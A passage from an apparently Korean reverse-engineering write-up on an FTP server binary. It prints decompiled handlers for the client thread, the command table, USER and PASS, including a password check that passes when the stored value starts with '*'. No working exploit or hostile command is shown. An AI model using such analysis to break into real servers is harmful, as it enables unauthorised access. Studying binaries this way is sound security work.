</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;500 Syntax error, command unrecognized.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">41LL</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">send</span>(v26, <span style="color:#e6db74">&#34;500 Syntax error, command unrecognized.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x29uLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">goto</span> LABEL_10;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        v14 <span style="color:#f92672">=</span> ((<span style="color:#66d9ef">__int64</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">pthread_mutex_t</span> <span style="color:#f92672">*</span>, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>))(<span style="color:#f92672">&amp;</span>ftpprocs)[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> v13 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>])(<span style="color:#f92672">&amp;</span>mutex, v19);<span style="color:#75715e">// CALL FTP USR
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ( v13 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xD</span> )
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; @@ CMD: &#34;</span>, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34;PASS ***&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; @@ CMD: &#34;</span>, (<span style="color:#66d9ef">__int64</span>)instr_recved);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ( v14 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>      v22 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(_DWORD)v29 )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">HIDWORD</span>(v29) <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2u</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">pthread_join</span>(v28, <span style="color:#f92672">&amp;</span>v22) )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34;Enter cancel&#34;</span>, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">pthread_cancel</span>(v28);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">LODWORD</span>(v29) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v27 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(v27);
</span></span><span style="display:flex;"><span>        v27 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v34 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(v34);
</span></span><span style="display:flex;"><span>        v34 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      v32 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      v33 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pthread_mutex_destroy</span>(<span style="color:#f92672">&amp;</span>mutex);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pthread_mutexattr_destroy</span>(v20);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v42 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>        v15 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)(v42 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)v42 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">+</span> (<span style="color:#66d9ef">float</span>)(v42 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)v42 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        v15 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)(<span style="color:#66d9ef">int</span>)v42;
</span></span><span style="display:flex;"><span>      v16 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)(v15 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0.00000095367432</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v41 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>        v17 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)(v41 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)v41 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">+</span> (<span style="color:#66d9ef">float</span>)(v41 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">|</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)v41 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        v17 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">float</span>)(<span style="color:#66d9ef">int</span>)v41;
</span></span><span style="display:flex;"><span>      ((<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>, <span style="color:#66d9ef">__int64</span>, <span style="color:#66d9ef">__int64</span>, <span style="color:#66d9ef">__int64</span>, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>, ...))__snprintf_chk)(
</span></span><span style="display:flex;"><span>        instr_recved,
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">4096LL</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1LL</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">4096LL</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34; User disconnected. </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;==== Session %u statistics ====</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Rx: %zd bytes (%f MBytes) total received by server in %zd files,</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Tx: %zd bytes (%f MBytes) total sent to the client in %zd files.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        v36,
</span></span><span style="display:flex;"><span>        v41,
</span></span><span style="display:flex;"><span>        (<span style="color:#66d9ef">float</span>)(v17 <span style="color:#f92672">*</span> <span style="color:#ae81ff">0.00000095367432</span>),
</span></span><span style="display:flex;"><span>        v43,
</span></span><span style="display:flex;"><span>        v42,
</span></span><span style="display:flex;"><span>        v16,
</span></span><span style="display:flex;"><span>        v44);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex, (<span style="color:#66d9ef">__int64</span>)instr_recved, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> v40;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v40 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">__int64</span>, _QWORD))gnutls_bye)(v40, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">*</span>)(<span style="color:#66d9ef">__int64</span>))gnutls_deinit)(v2);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">close</span>(v26);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>v18 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>recvcmd_part_0 함수는 \r\n으로 끝나는 명령어가 오면, instruction operand로 잘 분리해서 저장해주고, 함수를 호출한다.</p>
<pre tabindex="0"><code>.data.rel.ro:000000000000F8E0 ftpprocs        dq offset aUser_0       ; DATA XREF: ftp_client_thread:loc_9A3E↑o
.data.rel.ro:000000000000F8E0                                         ; ftp_client_thread+326↑o
.data.rel.ro:000000000000F8E0                                         ; &#34;USER&#34;
.data.rel.ro:000000000000F8E8                 dq offset ftpUSER
.data.rel.ro:000000000000F8F0                 dq offset aQuit+1       ; &#34;QUIT&#34;
.data.rel.ro:000000000000F8F8                 dq offset ftpQUIT
.data.rel.ro:000000000000F900                 dq offset aNoop         ; &#34;NOOP&#34;
.data.rel.ro:000000000000F908                 dq offset ftpNOOP
.data.rel.ro:000000000000F910                 dq offset aPwd          ; &#34;PWD&#34;
.data.rel.ro:000000000000F918                 dq offset ftpPWD
.data.rel.ro:000000000000F920                 dq offset aType         ; &#34;TYPE&#34;
.data.rel.ro:000000000000F928                 dq offset ftpTYPE
.data.rel.ro:000000000000F930                 dq offset aPort_0       ; &#34;PORT&#34;
.data.rel.ro:000000000000F938                 dq offset ftpPORT
.data.rel.ro:000000000000F940                 dq offset aList+1       ; &#34;LIST&#34;
.data.rel.ro:000000000000F948                 dq offset ftpLIST
.data.rel.ro:000000000000F950                 dq offset aCdup+1       ; &#34;CDUP&#34;
.data.rel.ro:000000000000F958                 dq offset ftpCDUP
.data.rel.ro:000000000000F960                 dq offset aCwd_0        ; &#34;CWD&#34;
.data.rel.ro:000000000000F968                 dq offset ftpCWD
.data.rel.ro:000000000000F970                 dq offset aRetr_0       ; &#34;RETR&#34;
.data.rel.ro:000000000000F978                 dq offset ftpRETR
.data.rel.ro:000000000000F980                 dq offset aAbor         ; &#34;ABOR&#34;
.data.rel.ro:000000000000F988                 dq offset ftpABOR
.data.rel.ro:000000000000F990                 dq offset aDele_0       ; &#34;DELE&#34;
.data.rel.ro:000000000000F998                 dq offset ftpDELE
.data.rel.ro:000000000000F9A0                 dq offset aPasv         ; &#34;PASV&#34;
.data.rel.ro:000000000000F9A8                 dq offset ftpPASV
.data.rel.ro:000000000000F9B0                 dq offset aPass_0       ; &#34;PASS&#34;
.data.rel.ro:000000000000F9B8                 dq offset ftpPASS
.data.rel.ro:000000000000F9C0                 dq offset aRest         ; &#34;REST&#34;
.data.rel.ro:000000000000F9C8                 dq offset ftpREST
.data.rel.ro:000000000000F9D0                 dq offset aSize_0       ; &#34;SIZE&#34;
.data.rel.ro:000000000000F9D8                 dq offset ftpSIZE
.data.rel.ro:000000000000F9E0                 dq offset aMkd_0        ; &#34;MKD&#34;
.data.rel.ro:000000000000F9E8                 dq offset ftpMKD
.data.rel.ro:000000000000F9F0                 dq offset aRmd          ; &#34;RMD&#34;
.data.rel.ro:000000000000F9F8                 dq offset ftpRMD
.data.rel.ro:000000000000FA00                 dq offset aStor_0       ; &#34;STOR&#34;
.data.rel.ro:000000000000FA08                 dq offset ftpSTOR
.data.rel.ro:000000000000FA10                 dq offset aSyst         ; &#34;SYST&#34;
.data.rel.ro:000000000000FA18                 dq offset ftpSYST
.data.rel.ro:000000000000FA20                 dq offset aFeat         ; &#34;FEAT&#34;
.data.rel.ro:000000000000FA28                 dq offset ftpFEAT
.data.rel.ro:000000000000FA30                 dq offset aAppe_0       ; &#34;APPE&#34;
.data.rel.ro:000000000000FA38                 dq offset ftpAPPE
.data.rel.ro:000000000000FA40                 dq offset aRnfr_0       ; &#34;RNFR&#34;
.data.rel.ro:000000000000FA48                 dq offset ftpRNFR
.data.rel.ro:000000000000FA50                 dq offset aRnto_0       ; &#34;RNTO&#34;
.data.rel.ro:000000000000FA58                 dq offset ftpRNTO
.data.rel.ro:000000000000FA60                 dq offset aOpts         ; &#34;OPTS&#34;
.data.rel.ro:000000000000FA68                 dq offset ftpOPTS
.data.rel.ro:000000000000FA70                 dq offset aMlsd         ; &#34;MLSD&#34;
.data.rel.ro:000000000000FA78                 dq offset ftpMLSD
.data.rel.ro:000000000000FA80                 dq offset aAuth         ; &#34;AUTH&#34;
.data.rel.ro:000000000000FA88                 dq offset ftpAUTH
.data.rel.ro:000000000000FA90                 dq offset aPbsz         ; &#34;PBSZ&#34;
.data.rel.ro:000000000000FA98                 dq offset ftpPBSZ
.data.rel.ro:000000000000FAA0                 dq offset aProt         ; &#34;PROT&#34;
.data.rel.ro:000000000000FAA8                 dq offset ftpPROT
.data.rel.ro:000000000000FAB0                 dq offset aEpsv         ; &#34;EPSV&#34;
.data.rel.ro:000000000000FAB8                 dq offset ftpEPSV
.data.rel.ro:000000000000FAC0                 dq offset aHelp_0       ; &#34;HELP&#34;
.data.rel.ro:000000000000FAC8                 dq offset ftpHELP
.data.rel.ro:000000000000FAD0                 dq offset aSite         ; &#34;SITE&#34;
.data.rel.ro:000000000000FAD8                 dq offset ftpSITE
.data.rel.ro:000000000000FAD8 _data_rel_ro    ends
.data.rel.ro:000000000000FAD8
</code></pre><p>이런식으로 string과 함수 주소가 잘 매칭되어있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>_BOOL8 <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">ftpUSER</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>mutex, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>user_name)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> v2; <span style="color:#75715e">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( user_name )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>((_DWORD <span style="color:#f92672">*</span>)mutex <span style="color:#f92672">+</span> <span style="color:#ae81ff">22</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)mutex, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; USER: &#34;</span>, (<span style="color:#66d9ef">__int64</span>)user_name);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__snprintf_chk</span>((<span style="color:#66d9ef">__int64</span>)(mutex <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3078</span>), <span style="color:#ae81ff">0x2000LL</span>, <span style="color:#ae81ff">1LL</span>, <span style="color:#ae81ff">0x2000LL</span>, <span style="color:#e6db74">&#34;331 User %s OK. Password required</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(mutex <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3078</span>);                <span style="color:#75715e">// make string
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)mutex <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xA0F</span>) )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">gnutls_record_send</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">send</span>(<span style="color:#f92672">*</span>((_DWORD <span style="color:#f92672">*</span>)mutex <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>), mutex <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3078</span>, v2, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__strcpy_chk</span>(mutex <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3078</span>, user_name, <span style="color:#ae81ff">0x2000uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)mutex <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xA0F</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(<span style="color:#f92672">*</span>((_DWORD <span style="color:#f92672">*</span>)mutex <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>), <span style="color:#e6db74">&#34;501 Syntax error in parameters or arguments.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x2EuLL</span>, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ftpUSER 함수는 유저 이름 받는 함수이다.
이때 config_parse를 통해서 config 파일에서 그 유저에 대한 접근 권한, root path에 대한 정보를 받아온다.
그 이후 PASS로 비밀번호 인증하라고 한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>_BOOL8 <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">ftpPASS</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>password)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// r8d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v5[<span style="color:#ae81ff">264</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-138h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// [rsp+108h] [rbp-30h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>password )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x5078</span>) )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">40</span>), <span style="color:#e6db74">&#34;501 Syntax error in parameters or arguments.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x2EuLL</span>, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(v5, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">config_parse</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)g_cfg, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3078</span>), <span style="color:#e6db74">&#34;pswd&#34;</span>, v5, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>qword_100)<span style="color:#75715e">// a, pswd, 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">||</span> <span style="color:#a6e22e">strcmp</span>(v5, password) <span style="color:#f92672">&amp;&amp;</span> v5[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;*&#39;</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x5078</span>) )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">gnutls_record_send</span>() <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">send</span>(<span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">40</span>), <span style="color:#e6db74">&#34;530 Invalid user name or password.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x24uLL</span>, <span style="color:#ae81ff">0x4000</span>) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1078</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2070</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1080</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFFFFFFFFF8LL</span>),
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">8LL</span> <span style="color:#f92672">*</span> (((_DWORD)a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1078</span> <span style="color:#f92672">-</span> (((_DWORD)a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1080</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFF8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">4096</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">3</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(v5, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">config_parse</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)g_cfg, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3078</span>), <span style="color:#e6db74">&#34;root&#34;</span>, (_BYTE <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1078</span>), <span style="color:#e6db74">&#34;a&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">config_parse</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)g_cfg, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3078</span>), <span style="color:#e6db74">&#34;accs&#34;</span>, v5, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>qword_100);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">88</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strcasecmp</span>(v5, <span style="color:#e6db74">&#34;admin&#34;</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>LABEL_7:
